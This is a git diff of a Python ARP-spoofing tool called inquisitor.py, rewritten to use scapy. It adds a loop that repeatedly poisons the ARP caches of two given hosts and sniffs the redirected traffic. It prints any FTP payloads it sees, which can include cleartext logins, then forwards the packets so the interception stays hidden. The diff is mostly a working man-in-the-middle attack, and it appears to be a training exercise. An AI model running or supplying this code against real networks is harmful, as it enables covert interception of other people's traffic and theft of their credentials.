@@ -2,15 +2,23 @@ import sys
 import ipaddress
 import re
 import signal
-from pylibpcap import get_iface_list, send_packet, sniff
 import uuid
 import socket
+import time
+from scapy.all import ls, sniff, PacketList, Packet, Raw
+from scapy.sendrecv import sendp, sr1, AsyncSniffer
+from scapy.interfaces import get_if_list
+from scapy.layers.l2 import Ether, ARP
+from scapy.layers.inet import IP, TCP
+
 
 IFACE='eth0'
 
 OP_REQUEST=1
 OP_REPLY=2
 ARP_PORT=219
+FTP_PORT=21
+SNIFFER=None
 
 class InquisitorException(Exception):
     pass
@@ -38,53 +46,13 @@ def padding(data: bytes, length: int):
         data = data + b"\x00" * (length - len(data))
     return data
 
-class ARP:
-    hardware_type: int
-    protocole_type: int
-    hardware_len: int
-    protocole_len: int
-    operation: int
-    sender_hardware_addr: bytes
-    sender_protocole_addr: bytes
-    target_hardware_addr: bytes
-    target_protocole_addr: bytes
-
-
-    def __init__(self):
-        pass
-
-    def create_request(self, src_ip: ipaddress.IPv4Address, src_mac: bytes, dst_ip: ipaddress.IPv4Address):
-        self.hardware_type: int = 1
-        self.protocole_type: int = 0x0800
-        self.hardware_len: int = 6
-        self.protocole_len: int = 4
-        self.operation: int = OP_REQUEST
-        self.sender_hardware_addr = src_mac
-        self.sender_protocole_addr = src_ip.packed
-        self.target_hardware_addr = b""
-        self.target_protocole_addr = dst_ip.packed
-    
-    def dump_data(self, endian = "big"):
-        hardware_type = self.hardware_type.to_bytes(2, endian)
-        protocole_type = self.protocole_type.to_bytes(2, endian)
-        hardware_len = self.hardware_len.to_bytes(1, endian)
-        protocole_len = self.protocole_len.to_bytes(1, endian)
-        operation = self.operation.to_bytes(2, endian)
-        sender_hardware_addr = padding(self.sender_hardware_addr, 6)
-        sender_protocole_addr = padding(self.sender_protocole_addr, 4)
-        target_hardware_addr = padding(self.target_hardware_addr, 6)
-        target_protocole_addr = padding(self.target_protocole_addr, 4)
-        return (
-            hardware_type
-            + protocole_type
-            + hardware_len
-            + protocole_len
-            + operation
-            + sender_hardware_addr
-            + sender_protocole_addr
-            + target_hardware_addr
-            + target_protocole_addr
-        )
+def get_ether_frame(src_mac: bytes, dst_mac: bytes | None, length: int):
+    if dst_mac is None:
+        dst_mac = b"\xff" * 6
+    preambule = b"\x00" * 7
+    sfd = 0b10101011.to_bytes(1, "big")
+    length = (length + 7 + 1 + 6 * 2 + 2 + 4).to_bytes(2, "big")
+    return preambule + sfd + dst_mac + src_mac + length
 
 def get_my_ip():
     hostname = socket.gethostname()
@@ -94,49 +62,59 @@ def get_my_ip():
 def send_arp_request(ip: str, mac_addr: str):
     pass
 
+def get_mac_for_ip(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address) -> str | None:
+    res = sr1(ARP(op=OP_REQUEST, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src))
+    if isinstance(res, ARP):
+        if not ( hasattr(res, "op") and hasattr(res, "psrc") and hasattr(res, "hwdst") and hasattr(res, "pdst") ):
+            return None
+        if res.op == OP_REPLY and res.psrc == str(ip_dst) and get_mac(res.hwdst) == mac_src and res.pdst == str(ip_src):
+            return res.hwsrc
+    return None
 
+def send_arp(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address, mac_dst: bytes) -> PacketList | None:
+    a = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=OP_REPLY, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src, hwdst=mac_dst, hwlen=6, plen=4)
+    return sendp(a, IFACE, verbose=False)
 
 def main(argv: list[str]):
     if len(argv) != 5:
         raise InquisitorException("need 4 arguments")
-    ip_src = get_ip(argv[1])
-    mac_src = get_mac(argv[2])
-    ip_target = get_ip(argv[3])
-    mac_target = get_mac(argv[4])
+    str_ip_src = argv[1]
+    str_ip_target = argv[3]
+    str_mac_src = argv[2]
+    str_mac_target = argv[4]
+    ip_src = get_ip(str_ip_src)
+    mac_src = get_mac(str_mac_src)
+    ip_target = get_ip(str_ip_target)
+    mac_target = get_mac(str_mac_target)
     my_mac_addr = uuid.getnode().to_bytes(6, "big")
     my_ip_addr = get_my_ip()
+    str_my_ip_addr = str(my_ip_addr)
     print("me", my_ip_addr, my_mac_addr)
     print("src", ip_src, mac_src)
     print("target", ip_target, mac_target)
-    iface = get_iface_list()
+    iface = get_if_list()
     if IFACE not in iface:
         raise InquisitorException(f"interface {IFACE} not found")
-    arp = ARP()
-    arp.create_request(my_ip_addr, my_mac_addr, ip_src)
-    data = arp.dump_data()
-    print(data, len(data))
-    send_packet(IFACE, data)
-    arp.create_request(my_ip_addr, my_mac_addr, ip_target)
-    data = arp.dump_data()
-    print(data, len(data))
-    send_packet(IFACE, data)
-    sniffobj = None
 
-    # try:
-    #     sniffobj = sniff(IFACE, filters=f"port {ARP_PORT}", count=1, promisc=0, out_file="pcap.pcap")
-
-    #     for plen, t, buf in sniffobj:
-    #         print("[+]: Payload len=", plen)
-    #         print("[+]: Time", t)
-    #         print("[+]: Payload", buf)
-    # except KeyboardInterrupt:
-    #     pass
-    # except Exception as e:
-    #     print(e)
-    # for plen, t, buf in sniff(IFACE, filters=f"port {ARP_PORT}", count=-1, promisc=1, out_file="pcap.pcap"):
-    #     print("[+]: Payload len=", plen)
-    #     print("[+]: Time", t)
-    #     print("[+]: Payload", buf)
+    ips = {str_ip_src: str_mac_src, str_ip_target: str_mac_target}
+    SNIFFER = AsyncSniffer(iface=IFACE, lfilter=lambda x: (x.haslayer(Ether) and x.haslayer(IP) and get_mac(x[Ether].dst) == my_mac_addr and x[IP].src in ips.keys() and x[IP].dst in ips.keys()))
+    SNIFFER.start()
+    while True:
+        send_arp(ip_target, my_mac_addr, ip_src, mac_src)
+        send_arp(ip_src, my_mac_addr, ip_target, mac_target)
+        time.sleep(.2)
+        r: list[Packet] | None = SNIFFER.stop()
+        SNIFFER.start()
+        if r is not None:
+            # print(r, len(r))
+            for p in r:
+                # print(p)
+                # p.show()
+                if Raw in p and FTP_PORT in [p[TCP].sport, p[TCP].dport]:
+                    print(f"{p[IP].src} -> {p[IP].dst} : {p[Raw].load.decode()}")
+                p[Ether].src = my_mac_addr
+                p[Ether].dst = ips[p[IP].dst]
+                sendp(p, IFACE, verbose=False)
 
 
 def usage():
@@ -146,12 +124,18 @@ python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <SRC-target>
 
 def signal_handler(signum, frame):
     print("Ctrl+C caught! Exiting gracefully...")
-    # TODO restore ARP table
+    print("Restore arp tables")
+    my_mac_addr = uuid.getnode().to_bytes(6, "big")
+    my_ip_addr = get_my_ip()
+    send_arp(my_ip_addr, my_mac_addr, ipaddress.IPv4Address(sys.argv[1]), get_mac(sys.argv[2]))
+    send_arp(my_ip_addr, my_mac_addr, ipaddress.IPv4Address(sys.argv[3]), get_mac(sys.argv[4]))
+    send_arp(ipaddress.IPv4Address(sys.argv[3]), get_mac(sys.argv[4]), ipaddress.IPv4Address(sys.argv[1]), get_mac(sys.argv[2]))
+    send_arp(ipaddress.IPv4Address(sys.argv[1]), get_mac(sys.argv[2]), ipaddress.IPv4Address(sys.argv[3]), get_mac(sys.argv[4]))
     sys.exit(0)
 
 if __name__ == '__main__':
     try:
-        # signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGINT, signal_handler)
         main(sys.argv)
     except InquisitorException as e:
         print(f"Error : {e}")
